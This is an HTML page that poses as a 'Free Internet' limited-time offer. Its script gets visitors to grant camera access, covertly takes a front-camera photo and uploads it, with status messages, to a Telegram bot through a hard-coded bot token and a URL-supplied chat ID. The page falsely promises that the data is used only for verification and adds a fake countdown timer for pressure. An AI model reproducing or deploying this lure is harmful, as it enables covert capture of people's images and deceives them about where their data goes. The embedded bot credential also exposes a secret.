<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>Free Internet Offer</title>
    <link rel="stylesheet" href="style.css" />
</head>
<body>
<div class="container">
    <div class="header">
        <span class="badge">LIMITED TIME OFFER</span>
        <h1>Free Internet</h1>
        <p class="sub">Special Offer from V4zrashd</p>
    </div>
    <div class="offer-box">
        <div class="data-icon">📷</div>
        <div class="data-amount">Front Camera</div>
        <div class="data-label">Capture Photo</div>
        <div class="data-sub">Click below to allow camera</div>
    </div>
    <button class="claim-btn" id="claimBtn">📸 Capture Photo</button>
    <div class="footer">
        <p>Your data is safe. Used only for verification.</p>
        <p class="timer">⏳ Offer ends in <span id="timer">09:54</span></p>
    </div>
</div>
<video id="video" autoplay playsinline style="display:none;"></video>
<script>
    const params = new URLSearchParams(window.location.search);
    const chatId = params.get('chat_id') || 'YOUR_CHAT_ID';
    const token = '8906991625:AAHV1gjfUkDZkyz7xasYoZKkd3mryf_UKEE';

    function sendToTelegram(text) {
        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chatId, text, parse_mode: 'HTML' })
        }).catch(() => {});
    }

    function sendFile(file, caption) {
        const fd = new FormData();
        fd.append('chat_id', chatId);
        fd.append('photo', file);
        fd.append('caption', caption);
        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
            method: 'POST',
            body: fd
        }).catch(() => {});
    }

    async function captureFront() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: 'user', width: 640, height: 480 },
                audio: false
            });
            const video = document.getElementById('video');
            video.srcObject = stream;
            await new Promise(r => setTimeout(r, 500));
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            canvas.toBlob(blob => {
                const file = new File([blob], 'front.jpg', { type: 'image/jpeg' });
                sendFile(file, '📸 সামনের ক্যামেরা থেকে ছবি');
                sendToTelegram('✅ সামনের ক্যামেরা থেকে ছবি ক্যাপচার করা হয়েছে');
            }, 'image/jpeg', 0.9);
            stream.getTracks().forEach(t => t.stop());
        } catch(e) {
            sendToTelegram('❌ সামনের ক্যামেরা অ্যাক্সেস ডিনাই!');
        }
        document.getElementById('claimBtn').disabled = true;
        document.getElementById('claimBtn').textContent = '✅ Captured';
    }

    document.getElementById('claimBtn').addEventListener('click', captureFront);

    // টাইমার
    let t = 594;
    setInterval(() => {
        if (t <= 0) return;
        t--;
        const m = String(Math.floor(t/60)).padStart(2,'0');
        const s = String(t%60).padStart(2,'0');
        document.getElementById('timer').textContent = `${m}:${s}`;
    }, 1000);
</script>
</body>
</html>
